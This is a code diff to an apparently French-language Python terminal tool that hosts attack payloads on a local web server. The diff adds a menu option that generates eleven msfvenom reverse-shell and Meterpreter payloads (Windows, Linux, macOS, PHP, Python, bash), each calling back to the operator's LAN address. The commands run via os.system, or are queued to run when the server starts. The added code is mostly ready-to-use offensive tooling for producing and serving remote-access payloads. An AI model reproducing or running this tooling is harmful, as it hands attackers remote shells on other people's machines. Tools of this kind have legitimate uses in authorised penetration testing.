@@ -147,9 +147,10 @@ _       __     __    ____  __                __
     stdscr.addstr(menu_y, table_x, "Options:", curses.A_BOLD)
     stdscr.addstr(menu_y+1, table_x+2, "1. Ouvrir/Fermer serveur web")
     stdscr.addstr(menu_y+2, table_x+2, "2. Ajouter un pload")
-    stdscr.addstr(menu_y+3, table_x+2, "3. Quitter")
+    stdscr.addstr(menu_y+3, table_x+2, "3. Ajouter des ploads msfvenom")
+    stdscr.addstr(menu_y+4, table_x+2, "0. Quitter")
     
-    stdscr.addstr(menu_y+6, table_x, "❯ ", curses.A_BOLD)
+    stdscr.addstr(menu_y+7, table_x, "❯ ", curses.A_BOLD)
     stdscr.refresh()
 
 
@@ -259,6 +260,97 @@ def add_pload(stdscr, server_active):
     curses.noecho()
 
 
+def progress_bar(stdscr, y, x, width, percent):
+    """Affiche une barre de progression à la position donnée"""
+    filled = int(width * percent)
+    bar = '█' * filled + '░' * (width - filled)
+    stdscr.addstr(y, x, f"[{bar}] {int(percent*100)}%")
+    stdscr.refresh()
+
+def add_msfvenom_pload(stdscr, server_active):
+    stdscr.clear()
+    curses.echo()
+    
+    # Vérifier si le répertoire msf_ploads existe déjà
+    rep_dest = os.path.dirname(__file__)+"/ploads/msf_ploads"
+    if os.path.exists(rep_dest):
+        stdscr.addstr(4, 2, "Le répertoire msf_ploads existe déjà!", curses.color_pair(2))
+        stdscr.addstr(5, 2, "Voulez-vous écraser les payloads existants pour changer de port? (o/N): ")
+        choice = stdscr.getstr().decode('utf-8').lower()
+        if choice != 'o':
+            stdscr.addstr(7, 2, "Opération annulée", curses.color_pair(1))
+            stdscr.addstr(9, 2, "Appuyez sur une touche pour continuer...")
+            stdscr.refresh()
+            stdscr.getch()
+            curses.noecho()
+            return
+    
+    # Demander le port pour les reverse shells
+    while True:
+        stdscr.addstr(4, 2, "Port pour les reverse shells: ")
+        try:
+            port = stdscr.getstr().decode('utf-8')
+            if not port.strip() or not port.isdigit() or int(port) < 1 or int(port) > 65535:
+                raise ValueError
+            break
+        except ValueError:
+            stdscr.addstr(5, 2, "Port invalide! Doit être entre 1 et 65535", curses.color_pair(2))
+            stdscr.refresh()
+            curses.napms(1500)
+            stdscr.addstr(5, 2, " " * 50)  # Efface le message d'erreur
+    
+    # Définir les commandes msfvenom
+    msfvenom_payloads = {
+        "meterpreter_staged_reverse_tcp": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_lan} LPORT={port} -f exe -o {rep_dest}/meterpreter_staged_reverse_tcp.exe",
+        "meterpreter_stageless_reverse_tcp": f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip_lan} LPORT={port} -f exe -o {rep_dest}/meterpreter_stageless_reverse_tcp.exe",
+        "windows_staged_reverse_tcp": f"msfvenom -p windows/x64/reverse_tcp LHOST={ip_lan} LPORT={port} -f exe -o {rep_dest}/windows_staged_reverse_tcp.exe",
+        "windows_stageless_reverse_tcp": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip_lan} LPORT={port} -f exe -o {rep_dest}/windows_stageless_reverse_tcp.exe",
+        "linux_meterpreter_staged_reverse_tcp": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip_lan} LPORT={port} -f elf -o {rep_dest}/linux_meterpreter_staged_reverse_tcp.elf",
+        "linux_stageless_reverse_tcp": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip_lan} LPORT={port} -f elf -o {rep_dest}/linux_stageless_reverse_tcp.elf",
+        "macos_meterpreter_staged_reverse_tcp": f"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip_lan} LPORT={port} -f macho -o {rep_dest}/macos_meterpreter_staged_reverse_tcp.macho",
+        "php_meterpreter_stageless_reverse_tcp": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip_lan} LPORT={port} -f raw -o {rep_dest}/php_meterpreter_stageless_reverse_tcp.php",
+        "php_reverse_php": f"msfvenom -p php/reverse_php LHOST={ip_lan} LPORT={port} -f raw -o {rep_dest}/php_reverse_php.php",
+        "python_stageless_reverse_tcp": f"msfvenom -p python/reverse_python LHOST={ip_lan} LPORT={port} -f raw -o {rep_dest}/python_stageless_reverse_tcp.py",
+        "bash_stageless_reverse_tcp": f"msfvenom -p cmd/unix/reverse_bash LHOST={ip_lan} LPORT={port} -f raw -o {rep_dest}/bash_stageless_reverse_tcp.sh"
+    }
+
+    try:
+        if server_active:
+            # Créer le répertoire msf_ploads si le serveur est actif
+            if not os.path.exists(rep_dest):
+                os.makedirs(rep_dest)
+            
+            # Exécuter les commandes msfvenom
+            stdscr.addstr(6, 2, "Génération des payloads en cours... Cela peut prendre un peu de temps..", curses.color_pair(1))
+            stdscr.refresh()
+            
+            total = len(msfvenom_payloads)
+            for i, (name, cmd) in enumerate(msfvenom_payloads.items(), 1):
+                stdscr.addstr(8, 2, " " * 80)  # Efface la ligne
+                stdscr.addstr(8, 2, f"Génération de: {name}")
+                os.system(cmd + " > /dev/null 2>&1")
+                progress_bar(stdscr, 9, 2, 50, i/total)
+                
+            stdscr.addstr(10, 2, "Payloads générés avec succès!", curses.color_pair(1))
+        else:
+            # Stocker les commandes en mémoire pour une exécution ultérieure
+            global temp_ploads
+            for name, cmd in msfvenom_payloads.items():
+                temp_ploads.append({
+                    "type": "msf_ploads",
+                    "name": name,
+                    "command": cmd
+                })
+            stdscr.addstr(6, 2, "Commandes stockées en mémoire. Seront exécutées au lancement du serveur.", curses.color_pair(1))
+            
+    except Exception as e:
+        stdscr.addstr(6, 2, f"Erreur: {str(e)}", curses.color_pair(2))
+    
+    stdscr.addstr(12, 2, "Appuyez sur une touche pour continuer...")
+    stdscr.refresh()
+    stdscr.getch()
+    curses.noecho()
+
 def main(stdscr):
     # Configuration des couleurs
     curses.start_color()
@@ -327,14 +419,23 @@ def main(stdscr):
                                 os.chmod(file_path, 0o777)
                 
                 # Charger les ploads temporaires
-                for temp_pload in temp_ploads:
+                total_temp = len(temp_ploads)
+                for i, temp_pload in enumerate(temp_ploads, 1):
                     key_dir = os.path.dirname(__file__)+'/ploads/'+temp_pload['type']
                     if not os.path.exists(key_dir):
                         os.makedirs(key_dir)
                     file_path = key_dir+'/'+temp_pload['name']+'.'+temp_pload['type']
-                    with open(file_path, 'w') as f:
-                        f.write(temp_pload['content'])
-                    os.chmod(file_path, 0o777)
+                    if temp_pload['type'] == 'msf_ploads':
+                        stdscr.addstr(22, 2, "Generation des ploads msf... Cela peut prendre un peu de temps..", curses.color_pair(1))
+                        stdscr.addstr(24, 2, " " * 80)  # Efface la ligne
+                        stdscr.addstr(24, 2, f"Génération de: {temp_pload['name']}")
+                        stdscr.refresh()
+                        os.system(temp_pload['command'] + " > /dev/null 2>&1")
+                        progress_bar(stdscr, 25, 2, 50, i/total_temp)
+                    else:
+                        with open(file_path, 'w') as f:
+                            f.write(temp_pload['content'])
+                        os.chmod(file_path, 0o777)
                 
                 if server_choice == 'php':
                     with open(os.path.dirname(__file__)+'/ploads/index.php', 'w') as f:
@@ -358,8 +459,11 @@ def main(stdscr):
         
         elif choice == ord('2'):
             add_pload(stdscr, server_active)
-            
+
         elif choice == ord('3'):
+            add_msfvenom_pload(stdscr, server_active)
+            
+        elif choice == ord('0'):
             exit()
 
 if __name__ == "__main__":
